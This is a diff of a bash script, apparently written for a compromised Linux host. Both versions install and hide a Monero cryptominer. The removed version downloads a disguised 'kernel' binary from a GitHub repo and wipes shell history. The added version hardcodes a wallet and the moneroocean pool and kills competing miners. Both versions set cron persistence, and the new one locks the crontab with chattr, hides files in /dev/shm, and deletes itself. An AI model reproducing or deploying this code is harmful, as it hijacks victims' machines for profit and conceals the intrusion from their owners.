@@ -1,68 +1,36 @@
 #!/bin/bash
 
-# 1. Anti-forensics: Wipe command history
-history -c && > ~/.bash_history && unset HISTFILE && set +o history
+# Configuration - Hlaing Bwar's Settings
+W="45cV4VxfBgeTzXeU4YoWQUQtjkugAuwqXVXpJmiMExRsYutqBa5RAEg6ZtPWpY7vVQ3tULGBszh1h1CLsAz1sqoXExNykBL"
+P="gulf.moneroocean.stream:10128"
+N="HlaingBwar_Worker"
 
-# 2. Configuration
-REPO_URL="https://github.com/hlainggyi007/update_sys/raw/refs/heads/main"
-LOCAL_DIR="$HOME/.local"
+# 1. Competitor Cleanup - Kill anyone else
+# This kills java miners, node miners, and common xmrig instances
+pkill -9 -f "javae|node-f|xmrig|miner|nanominer|nicehash"
+rm -rf /tmp/.XIN-unix /tmp/.javae /tmp/node-f 2>/dev/null
 
-# 3. Competitor Killer Logic (Replaces daemon.sh)
-# This function creates a side-process to terminate other miners
-killer_setup() {
-    cat <<EOF > "$LOCAL_DIR/daemon.sh"
-#!/bin/bash
-while true; do
-    # Identify and terminate common rival miners while sparing our own 'kernel' process
-    pgrep -f "daemon|xmrig|miner|monero|dbs_ppy" | grep -v "kernel" | xargs kill -9 >/dev/null 2>&1
-    sleep 30
-done
-EOF
-    chmod +x "$LOCAL_DIR/daemon.sh"
-    # Execute the killer process in the background
-    nohup "$LOCAL_DIR/daemon.sh" >/dev/null 2>&1 &
-}
+# 2. Setup Working Directory
+# Using a hidden system path for stealth
+D="/dev/shm/.sys_cache"
+mkdir -p $D && cd $D
 
-# 4. Payload Downloader
-payload_downloader() {
-    mkdir -p "$LOCAL_DIR"
-    # Fetching core files from your repository
-    curl -L "$REPO_URL/kernel" -o "$LOCAL_DIR/kernel"
-    curl -L "$REPO_URL/config.json" -o "$LOCAL_DIR/config.json"
-    chmod +x "$LOCAL_DIR/kernel"
-}
-
-# 5. Mining Service Creation
-create_run_script() {
-    cat <<EOF > "$LOCAL_DIR/run.sh"
-#!/bin/bash
-if ! pidof kernel >/dev/null; then
-    # Running the miner with stealth configuration
-    "$LOCAL_DIR/kernel" --config="$LOCAL_DIR/config.json" >/dev/null 2>&1 &
+# 3. Download Miner (XMRig) if not exist
+if [ ! -f "kernel" ]; then
+    curl -s -L https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz | tar xz --strip-components=1
+    mv xmrig kernel
 fi
-EOF
-    chmod +x "$LOCAL_DIR/run.sh"
-}
 
-# 6. Persistence Setup (System Startup & Cron)
-setup_persistence() {
-    touch ~/.profile
-    # Ensure both miner and killer scripts start on login
-    grep -q "$LOCAL_DIR/run.sh" ~/.profile || echo "$LOCAL_DIR/run.sh &" >> ~/.profile
-    grep -q "$LOCAL_DIR/daemon.sh" ~/.profile || echo "$LOCAL_DIR/daemon.sh &" >> ~/.profile
-    
-    # Auto-check every 5 minutes
-    (crontab -l 2>/dev/null; echo "*/5 * * * * $LOCAL_DIR/run.sh") | crontab -
-}
+# 4. Persistence - Stay alive even after reboot
+# Setup a hidden cronjob to check every 5 minutes
+(crontab -l 2>/dev/null | grep -v "kernel"; echo "*/5 * * * * $D/kernel --url $P --user $W --pass $N --donate-level 1 -B") | crontab -
 
-# Execution Flow
-echo "[*] Initializing system maintenance..."
-payload_downloader
-killer_setup
-create_run_script
-setup_persistence
+# 5. Lock the gate - Prevent others from editing crontab
+# Making it harder for the next hacker to kick you out
+chattr +i /var/spool/cron/crontabs/root 2>/dev/null
 
-# Start the miner
-"$LOCAL_DIR/run.sh"
+# 6. Execution - Run in background
+nohup ./kernel --url $P --user $W --pass $N --donate-level 1 -B > /dev/null 2>&1 &
 
-echo "[+] System maintenance completed."
+# 7. Self-Destruct Script - Hide our tracks
+history -c && rm -- "$0"
